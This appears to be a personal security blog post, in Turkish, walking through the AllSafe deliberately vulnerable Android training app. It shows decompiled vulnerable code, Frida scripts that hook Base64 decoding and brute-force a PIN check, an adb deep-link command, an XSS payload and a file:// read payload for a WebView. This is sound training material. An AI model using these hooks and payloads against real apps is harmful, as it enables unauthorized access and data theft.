@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AllSafe APK Walkthrough | Neslihan Gürgen</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+
+<body>
+
+    <header class="navbar">
+
+    <nav>
+
+        <a href="/">Home</a>
+
+        <a href="/posts/">Posts</a>
+
+        <a href="/research/">Research</a>
+
+        <a href="/projects/">Projects</a>
+
+        <a href="/categories/">Categories</a>
+
+        <a href="/cheat-sheets/">Cheat Sheets</a>
+
+    </nav>
+
+</header>
+
+    <div class="page">
+
+        <aside class="sidebar">
+
+        <div class="profile-image">
+            <img src="/assets/pinguu.jpg" alt="Neslihan Gürgen">        </div>
+
+        <h1>Neslihan Gürgen</h1>
+
+        <p class="role">
+            Cybersecurity Enthusiast
+        </p>
+
+        <p class="bio">
+            Application Security |
+            Penetration Testing
+        </p>
+
+        <div class="social-links">
+            <a href="https://medium.com/@grgnes" target="_blank">Medium</a>
+            <a href="mailto:ngurgen08@gmail.com">Email</a>
+            <a href="https://github.com/grgnes" target="_blank">GitHub</a>
+            <a href="https://www.linkedin.com/in/neslihan-gurgen/" target="_blank">LinkedIn</a>
+        </div>
+
+    </aside>
+
+        <main class="content">
+            <article class="post-page">
+
+    <a class="category"
+       href="/categories/apk/">
+        APK
+    </a>
+
+    <h1>AllSafe APK Walkthrough</h1>
+
+    <div class="date">
+        July 28, 2026
+    </div>
+
+    <div class="tags">
+        
+        <span>Mobile Security</span>
+        
+        <span>APK</span>
+        
+    </div>
+
+    <div class="post-content">
+        <p><img src="/assets/posts/allsafe-apk/screenshot1.png" width="400" /></p>
+
+<h2 id="insecure-logging">Insecure Logging</h2>
+
+<p><img src="/assets/posts/allsafe-apk/image (1).png" width="400" /></p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">static</span> <span class="cm">/* synthetic */</span> <span class="kt">boolean</span> <span class="n">lambda$onCreateView</span><span class="err">$</span><span class="mi">0</span><span class="o">(</span><span class="nc">TextInputEditText</span> <span class="n">secret</span><span class="o">,</span> <span class="nc">TextView</span> <span class="n">v</span><span class="o">,</span> <span class="kt">int</span> <span class="n">actionId</span><span class="o">,</span> <span class="nc">KeyEvent</span> <span class="n">event</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">actionId</span> <span class="o">!=</span> <span class="mi">6</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="nc">Editable</span> <span class="n">text</span> <span class="o">=</span> <span class="n">secret</span><span class="o">.</span><span class="na">getText</span><span class="o">();</span>
+        <span class="nc">Objects</span><span class="o">.</span><span class="na">requireNonNull</span><span class="o">(</span><span class="n">text</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(!</span><span class="n">text</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">""</span><span class="o">))</span> <span class="o">{</span>
+            <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"ALLSAFE"</span><span class="o">,</span> <span class="s">"User entered secret: "</span> <span class="o">+</span> <span class="n">secret</span><span class="o">.</span><span class="na">getText</span><span class="o">().</span><span class="na">toString</span><span class="o">());</span>
+            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<p><img src="/assets/posts/allsafe-apk/image (2).png" width="700" /></p>
+
+<p>Buradaki zafiyet, input olarak ne verilirse log’a düşmesi.</p>
+
+<h2 id="hardcoded-credentials">Hardcoded Credentials</h2>
+
+<p><img src="/assets/posts/allsafe-apk/image (3).png" width="700" /></p>
+
+<p><img src="/assets/posts/allsafe-apk/image (4).png" width="700" /></p>
+
+<p><img src="/assets/posts/allsafe-apk/image (5).png" width="700" /></p>
+
+<p><img src="/assets/posts/allsafe-apk/image (6).png" width="700" /></p>
+
+<p>Buradaki zafiyetler, kaynak kodun içerisinde bazı kimlik bilgilerinin yazılmış olması.</p>
+
+<h2 id="firebase-database">Firebase Database</h2>
+
+<p><img src="/assets/posts/allsafe-apk/image (7).png" width="700" /></p>
+
+<p><img src="/assets/posts/allsafe-apk/image (8).png" width="700" /></p>
+
+<p>/resources.arsc/res/values/strings.xml den bulduğum firebase database url’si ile flag’i elde ettim. Firebase, verileri JSON benzeri belgelerde depolayan bir noSQL veritabanı programı olarak sınıflandırılır.</p>
+
+<h2 id="insecure-shared-preferences">Insecure Shared Preferences</h2>
+
+<p><img src="/assets/posts/allsafe-apk/image (9).png" width="700" /></p>
+
+<p><img src="/assets/posts/allsafe-apk/image (10).png" width="700" /></p>
+
+<p>Buradaki zafiyet, emülatöre girilen inputlar sharedpref’e kayıt ediliyor.</p>
+
+<p>Emülatöre input girmeden frida ile sharedpref’e input gönderme</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Java</span><span class="o">.</span><span class="na">perform</span><span class="o">(</span><span class="n">function</span> <span class="o">()</span> <span class="o">{</span>
+    <span class="kt">var</span> <span class="nc">SharedPreferencesImpl</span> <span class="o">=</span> <span class="nc">Java</span><span class="o">.</span><span class="na">use</span><span class="o">(</span><span class="s">"android.app.SharedPreferencesImpl$EditorImpl"</span><span class="o">);</span> 
+    <span class="nc">SharedPreferencesImpl</span><span class="o">.</span><span class="na">putString</span><span class="o">.</span><span class="na">implementation</span> <span class="o">=</span> <span class="n">function</span> <span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">value</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">console</span><span class="o">.</span><span class="na">log</span><span class="o">(</span><span class="n">key</span> <span class="o">,</span><span class="n">value</span><span class="o">);</span>
+        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">putString</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span> 
+    <span class="o">};</span>
+
+    <span class="kt">var</span> <span class="n">context</span> <span class="o">=</span> <span class="nc">Java</span><span class="o">.</span><span class="na">use</span><span class="o">(</span><span class="s">"android.app.ActivityThread"</span><span class="o">).</span><span class="na">currentApplication</span><span class="o">().</span><span class="na">getApplicationContext</span><span class="o">();</span>
+    <span class="kt">var</span> <span class="n">prefs</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getSharedPreferences</span><span class="o">(</span><span class="s">"user"</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
+    <span class="kt">var</span> <span class="n">editor</span> <span class="o">=</span> <span class="n">prefs</span><span class="o">.</span><span class="na">edit</span><span class="o">();</span>
+    <span class="n">editor</span><span class="o">.</span><span class="na">putString</span><span class="o">(</span><span class="s">"username"</span><span class="o">,</span> <span class="s">"user"</span><span class="o">);</span>
+    <span class="n">editor</span><span class="o">.</span><span class="na">putString</span><span class="o">(</span><span class="s">"password"</span><span class="o">,</span> <span class="s">"pass"</span><span class="o">);</span>
+    <span class="n">editor</span><span class="o">.</span><span class="na">commit</span><span class="o">();</span> 
+<span class="o">});</span>
+
+</code></pre></div></div>
+
+<h2 id="sql-injection">SQL Injection</h2>
+
+<p><img src="/assets/posts/allsafe-apk/image (11).png" width="700" /></p>
+
+<p><img src="/assets/posts/allsafe-apk/image (12).png" width="500" /></p>
+
+<p><img src="/assets/posts/allsafe-apk/image (13).png" width="500" /></p>
+
+<p>SQL injection yapmasak bile zaten bilgileri kaynak kodta verilmiş credentials.</p>
+
+<p><img src="/assets/posts/allsafe-apk/image (14).png" width="700" /></p>
+
+<h2 id="pin-bypass">PIN Bypass</h2>
+
+<p>Kaynak kodu incelediğimde,</p>
+
+<p><img src="/assets/posts/allsafe-apk/image (15).png" width="700" /></p>
+
+<p>önce verilen input’un boş olmadığını, sonra da null olup olmadığını kontrol edip checkpin ‘in doğru değerinde ve yanlış değerinde verilecek mesajları yazdırıyor. Biraz aşağı indiğimde,</p>
+
+<p><img src="/assets/posts/allsafe-apk/image (16).png" width="400" /></p>
+
+<p>bir base64 decode edildiğini görüyorum.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Java</span><span class="p">.</span><span class="nx">perform</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">Base64</span> <span class="o">=</span> <span class="nx">Java</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">"</span><span class="s2">android.util.Base64</span><span class="dl">"</span><span class="p">);</span>
+    <span class="c1">// decode(String, int) fonksiyonunu izliyoruz</span>
+    <span class="nx">Base64</span><span class="p">.</span><span class="nx">decode</span><span class="p">.</span><span class="nx">overload</span><span class="p">(</span><span class="dl">"</span><span class="s2">java.lang.String</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">int</span><span class="dl">"</span><span class="p">).</span><span class="nx">implementation</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">gizliYazi</span><span class="p">,</span> <span class="nx">flags</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">gizliYazi</span><span class="p">);</span>
+
+        <span class="kd">var</span> <span class="nx">sonuc</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">decode</span><span class="p">(</span><span class="nx">gizliYazi</span><span class="p">,</span> <span class="nx">flags</span><span class="p">);</span>
+
+        <span class="c1">// Byte array → string'e çevir</span>
+        <span class="kd">var</span> <span class="nx">gizliPin</span> <span class="o">=</span> <span class="nx">Java</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">"</span><span class="s2">java.lang.String</span><span class="dl">"</span><span class="p">).</span><span class="nx">$new</span><span class="p">(</span><span class="nx">sonuc</span><span class="p">);</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">gizliPin</span><span class="p">);</span>  <span class="c1">//Burada asıl pin'i veriyor</span>
+
+        <span class="k">return</span> <span class="nx">sonuc</span><span class="p">;</span>
+    <span class="p">};</span>
+<span class="p">});</span>
+
+</code></pre></div></div>
+
+<p>Bu frida scripti ile input olarak verilen random sayı ile asıl pin’e ulaşıyoruz.</p>
+
+<p>Başka bulduğum script örnekleri</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Java</span><span class="p">.</span><span class="nx">perform</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+
+    <span class="kd">var</span> <span class="nx">pinClass</span> <span class="o">=</span> <span class="nx">Java</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">"</span><span class="s2">infosecadventures.allsafe.challenges.PinBypass</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nx">pinClass</span><span class="p">.</span><span class="nx">checkPin</span><span class="p">.</span><span class="nx">implementation</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">pin</span><span class="p">){</span>
+        <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="mi">9999</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+            <span class="kd">var</span> <span class="nx">isValidPin</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">checkPin</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">i</span><span class="p">).</span><span class="nx">padStart</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mi">0</span><span class="p">));</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">isValidPin</span><span class="p">){</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] Valid PIN found: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span><span class="p">);</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Java</span><span class="p">.</span><span class="nx">perform</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+	<span class="nx">Java</span><span class="p">.</span><span class="nx">choose</span><span class="p">(</span><span class="dl">'</span><span class="s1">infosecadventures.allsafe.challenges.PinBypass</span><span class="dl">'</span><span class="p">,{</span>
+		<span class="na">onMatch</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">instance</span><span class="p">){</span>
+			<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">1000</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mi">10000</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span>
+			<span class="p">{</span>
+				<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Checking </span><span class="dl">"</span><span class="o">+</span><span class="nx">i</span><span class="p">.</span><span class="nx">toString</span><span class="p">())</span>
+				<span class="k">if</span><span class="p">(</span><span class="nx">instance</span><span class="p">.</span><span class="nx">checkPin</span><span class="p">(</span><span class="nx">i</span><span class="p">.</span><span class="nx">toString</span><span class="p">())</span><span class="o">==</span> <span class="kc">true</span><span class="p">)</span>
+				<span class="p">{</span>
+					<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Pin found : </span><span class="dl">"</span><span class="o">+</span><span class="nx">i</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
+					<span class="k">break</span><span class="p">;</span>
+				<span class="p">}</span>
+			<span class="p">}</span>
+	<span class="p">},</span>
+	<span class="na">onComplete</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{}</span>
+	<span class="p">});</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<h2 id="deep-link-exploitation">Deep Link Exploitation</h2>
+
+<p><img src="/assets/posts/allsafe-apk/image (17).png" width="700" /></p>
+
+<p><img src="/assets/posts/allsafe-apk/image (18).png" width="700" /></p>
+
+<p><img src="/assets/posts/allsafe-apk/image (19).png" width="400" /></p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">adb</span> <span class="n">shell</span> <span class="n">am</span> <span class="n">start</span> <span class="o">-</span><span class="n">a</span> <span class="s">"android.intent.action.VIEW"</span> <span class="o">-</span><span class="n">d</span> <span class="s">"allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c"</span>
+</code></pre></div></div>
+
+<h2 id="vulnerable-webview">Vulnerable WebView</h2>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+    <span class="kd">public</span> <span class="cm">/* synthetic */</span> <span class="kt">void</span> <span class="n">lambda$onCreateView</span><span class="err">$</span><span class="mi">0</span><span class="n">$VulnerableWebView</span><span class="o">(</span><span class="nc">TextInputEditText</span> <span class="n">payload</span><span class="o">,</span> <span class="nc">WebView</span> <span class="n">webView</span><span class="o">,</span> <span class="nc">View</span> <span class="n">v</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">Editable</span> <span class="n">text</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="na">getText</span><span class="o">();</span>
+        <span class="nc">Objects</span><span class="o">.</span><span class="na">requireNonNull</span><span class="o">(</span><span class="n">text</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(!</span><span class="n">text</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">isEmpty</span><span class="o">())</span> <span class="o">{</span>
+            <span class="nc">Editable</span> <span class="n">text2</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="na">getText</span><span class="o">();</span>
+            <span class="nc">Objects</span><span class="o">.</span><span class="na">requireNonNull</span><span class="o">(</span><span class="n">text2</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="nc">URLUtil</span><span class="o">.</span><span class="na">isValidUrl</span><span class="o">(</span><span class="n">text2</span><span class="o">.</span><span class="na">toString</span><span class="o">()))</span> <span class="o">{</span>
+                <span class="n">webView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="n">payload</span><span class="o">.</span><span class="na">getText</span><span class="o">().</span><span class="na">toString</span><span class="o">());</span>
+                <span class="k">return</span><span class="o">;</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="n">webView</span><span class="o">.</span><span class="na">setWebChromeClient</span><span class="o">(</span><span class="k">new</span> <span class="nc">WebChromeClient</span><span class="o">());</span>
+                <span class="n">webView</span><span class="o">.</span><span class="na">loadData</span><span class="o">(</span><span class="n">payload</span><span class="o">.</span><span class="na">getText</span><span class="o">().</span><span class="na">toString</span><span class="o">(),</span> <span class="s">"text/html"</span><span class="o">,</span> <span class="s">"UTF-8"</span><span class="o">);</span>
+                <span class="k">return</span><span class="o">;</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="nc">SnackUtil</span><span class="o">.</span><span class="na">INSTANCE</span><span class="o">.</span><span class="na">simpleMessage</span><span class="o">(</span><span class="n">requireActivity</span><span class="o">(),</span> <span class="s">"No payload provided!"</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Kullanıcının girdiği her şeyi HTML olarak yorumlayıp çalıştırıyor.</p>
+
+<p><img src="/assets/posts/allsafe-apk/image (20).png" width="400" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>first task : &lt;svg <span class="nv">onload</span><span class="o">=</span>alert<span class="o">(</span>”selam”<span class="o">)</span> <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p><img src="/assets/posts/allsafe-apk/image (21).png" width="400" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>second task: file://etc/hosts
+</code></pre></div></div>
+
+<p><img src="/assets/posts/allsafe-apk/image (22).png" width="400" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>benim örneğim: https://www.google.com/
+</code></pre></div></div>
+
+<h2 id="insecure-broadcast-receiver">Insecure Broadcast Receiver</h2>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+    <span class="kd">public</span> <span class="cm">/* synthetic */</span> <span class="kt">void</span> <span class="n">lambda$onCreateView</span><span class="err">$</span><span class="mi">0</span><span class="n">$InsecureBroadcastReceiver</span><span class="o">(</span><span class="nc">TextInputEditText</span> <span class="n">note</span><span class="o">,</span> <span class="nc">View</span> <span class="n">v</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(!</span><span class="n">note</span><span class="o">.</span><span class="na">getText</span><span class="o">().</span><span class="na">toString</span><span class="o">().</span><span class="na">isEmpty</span><span class="o">())</span> <span class="o">{</span>
+            <span class="c1">// Kullanıcıdan alınan not boş değilse bir intent oluşturuluyor</span>
+            <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+            <span class="n">intent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">"infosecadventures.allsafe.action.PROCESS_NOTE"</span><span class="o">);</span>
+            
+            <span class="c1">// intente bazı bilgiler ekleniyor</span>
+            <span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"server"</span><span class="o">,</span> <span class="s">"prod.allsafe.infosecadventures.io"</span><span class="o">);</span>
+            <span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"note"</span><span class="o">,</span> <span class="n">note</span><span class="o">.</span><span class="na">getText</span><span class="o">().</span><span class="na">toString</span><span class="o">());</span>
+            <span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"notification_message"</span><span class="o">,</span> <span class="s">"Allsafe is processing your note..."</span><span class="o">);</span>
+            
+            <span class="c1">// intent'i kimler alacak onu belirliyor </span>
+            <span class="nc">PackageManager</span> <span class="n">packageManager</span> <span class="o">=</span> <span class="n">requireActivity</span><span class="o">().</span><span class="na">getPackageManager</span><span class="o">();</span>
+            <span class="nc">List</span><span class="o">&lt;</span><span class="nc">ResolveInfo</span><span class="o">&gt;</span> <span class="n">resolveInfos</span> <span class="o">=</span> <span class="n">packageManager</span><span class="o">.</span><span class="na">queryBroadcastReceivers</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
+            
+            <span class="c1">// Bulduğu her uygulamaya intent gönderiyor</span>
+            <span class="k">for</span> <span class="o">(</span><span class="nc">ResolveInfo</span> <span class="n">info</span> <span class="o">:</span> <span class="n">resolveInfos</span><span class="o">)</span> <span class="o">{</span>
+                <span class="nc">ComponentName</span> <span class="n">cn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ComponentName</span><span class="o">(</span><span class="n">info</span><span class="o">.</span><span class="na">activityInfo</span><span class="o">.</span><span class="na">packageName</span><span class="o">,</span> <span class="n">info</span><span class="o">.</span><span class="na">activityInfo</span><span class="o">.</span><span class="na">name</span><span class="o">);</span>
+                <span class="n">intent</span><span class="o">.</span><span class="na">setComponent</span><span class="o">(</span><span class="n">cn</span><span class="o">);</span>
+                <span class="n">requireActivity</span><span class="o">().</span><span class="na">sendBroadcast</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="nc">SnackUtil</span><span class="o">.</span><span class="na">INSTANCE</span><span class="o">.</span><span class="na">simpleMessage</span><span class="o">(</span><span class="n">requireActivity</span><span class="o">(),</span> <span class="s">"Saving note..."</span><span class="o">);</span>
+            <span class="k">return</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="nc">SnackUtil</span><span class="o">.</span><span class="na">INSTANCE</span><span class="o">.</span><span class="na">simpleMessage</span><span class="o">(</span><span class="n">requireActivity</span><span class="o">(),</span> <span class="s">"The note field can't be empty!"</span><span class="o">);</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<p>Kullanıcının girdiği notu bir intent’e ekleyip, bu intent’i cihazdaki ilgili tüm uygulamalara broadcast olarak gönderiyor.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kt">void</span> <span class="nf">onReceive</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">,</span> <span class="nc">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
+        <span class="c1">// Intent’ten veri çekiliyor</span>
+        <span class="nc">String</span> <span class="n">server</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">"server"</span><span class="o">);</span>
+        <span class="nc">String</span> <span class="n">note</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">"note"</span><span class="o">);</span>
+        <span class="nc">String</span> <span class="n">notification_message</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">"notification_message"</span><span class="o">);</span>
+        
+        <span class="c1">// HTTP URL oluşturuluyor</span>
+        <span class="nc">OkHttpClient</span> <span class="n">okHttpClient</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">OkHttpClient</span><span class="o">.</span><span class="na">Builder</span><span class="o">().</span><span class="na">build</span><span class="o">();</span>
+        <span class="nc">HttpUrl</span> <span class="n">httpUrl</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HttpUrl</span><span class="o">.</span><span class="na">Builder</span><span class="o">().</span><span class="na">scheme</span><span class="o">(</span><span class="s">"http"</span><span class="o">).</span><span class="na">host</span><span class="o">(</span><span class="n">server</span><span class="o">).</span><span class="na">addPathSegment</span><span class="o">(</span><span class="s">"api"</span><span class="o">).</span><span class="na">addPathSegment</span><span class="o">(</span><span class="s">"v1"</span><span class="o">).</span><span class="na">addPathSegment</span><span class="o">(</span><span class="s">"note"</span><span class="o">).</span><span class="na">addPathSegment</span><span class="o">(</span><span class="s">"add"</span><span class="o">).</span><span class="na">addQueryParameter</span><span class="o">(</span><span class="s">"auth_token"</span><span class="o">,</span> <span class="s">"YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4="</span><span class="o">).</span><span class="na">addQueryParameter</span><span class="o">(</span><span class="s">"note"</span><span class="o">,</span> <span class="n">note</span><span class="o">).</span><span class="na">build</span><span class="o">();</span>
+        <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"ALLSAFE"</span><span class="o">,</span> <span class="n">httpUrl</span><span class="o">.</span><span class="na">getUrl</span><span class="o">());</span>
+        
+        <span class="c1">// HTTP isteği gönderiliyor</span>
+        <span class="nc">Request</span> <span class="n">request</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Request</span><span class="o">.</span><span class="na">Builder</span><span class="o">().</span><span class="na">url</span><span class="o">(</span><span class="n">httpUrl</span><span class="o">).</span><span class="na">build</span><span class="o">();</span>
+        <span class="n">okHttpClient</span><span class="o">.</span><span class="na">newCall</span><span class="o">(</span><span class="n">request</span><span class="o">).</span><span class="na">enqueue</span><span class="o">(</span><span class="k">new</span> <span class="nc">Callback</span><span class="o">()</span> <span class="o">{</span> <span class="c1">// from class: infosecadventures.allsafe.challenges.NoteReceiver.1</span>
+            <span class="nd">@Override</span> <span class="c1">// okhttp3.Callback</span>
+            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onFailure</span><span class="o">(</span><span class="nc">Call</span> <span class="n">call</span><span class="o">,</span> <span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"ALLSAFE"</span><span class="o">,</span> <span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+            <span class="o">}</span>
+
+            <span class="nd">@Override</span> <span class="c1">// okhttp3.Callback</span>
+            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onResponse</span><span class="o">(</span><span class="nc">Call</span> <span class="n">call</span><span class="o">,</span> <span class="nc">Response</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
+                <span class="nc">ResponseBody</span> <span class="n">body</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="na">body</span><span class="o">();</span>
+                <span class="nc">Objects</span><span class="o">.</span><span class="na">requireNonNull</span><span class="o">(</span><span class="n">body</span><span class="o">);</span>
+                <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"ALLSAFE"</span><span class="o">,</span> <span class="n">body</span><span class="o">.</span><span class="na">string</span><span class="o">());</span>
+            <span class="o">}</span>
+        <span class="o">});</span>
+        <span class="c1">// Bildirim gösteriliyor</span>
+        <span class="nc">NotificationCompat</span><span class="o">.</span><span class="na">Builder</span> <span class="n">builder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NotificationCompat</span><span class="o">.</span><span class="na">Builder</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="s">"ALLSAFE"</span><span class="o">);</span>
+        <span class="n">builder</span><span class="o">.</span><span class="na">setContentTitle</span><span class="o">(</span><span class="s">"Notification from Allsafe"</span><span class="o">);</span>
+        <span class="n">builder</span><span class="o">.</span><span class="na">setContentText</span><span class="o">(</span><span class="n">notification_message</span><span class="o">);</span>
+        <span class="n">builder</span><span class="o">.</span><span class="na">setSmallIcon</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">mipmap</span><span class="o">.</span><span class="na">ic_launcher_round</span><span class="o">);</span>
+        <span class="n">builder</span><span class="o">.</span><span class="na">setAutoCancel</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">builder</span><span class="o">.</span><span class="na">setChannelId</span><span class="o">(</span><span class="s">"ALLSAFE"</span><span class="o">);</span>
+        <span class="nc">Notification</span> <span class="n">notification</span> <span class="o">=</span> <span class="n">builder</span><span class="o">.</span><span class="na">build</span><span class="o">();</span>
+        <span class="nc">NotificationManager</span> <span class="n">notificationManager</span> <span class="o">=</span> <span class="o">(</span><span class="nc">NotificationManager</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">getSystemService</span><span class="o">(</span><span class="s">"notification"</span><span class="o">);</span>
+        <span class="nc">NotificationChannel</span> <span class="n">notificationChannel</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NotificationChannel</span><span class="o">(</span><span class="s">"ALLSAFE"</span><span class="o">,</span> <span class="s">"ALLSAFE_NOTIFICATION"</span><span class="o">,</span> <span class="mi">4</span><span class="o">);</span>
+        <span class="n">notificationManager</span><span class="o">.</span><span class="na">createNotificationChannel</span><span class="o">(</span><span class="n">notificationChannel</span><span class="o">);</span>
+        <span class="n">notificationManager</span><span class="o">.</span><span class="na">notify</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">notification</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
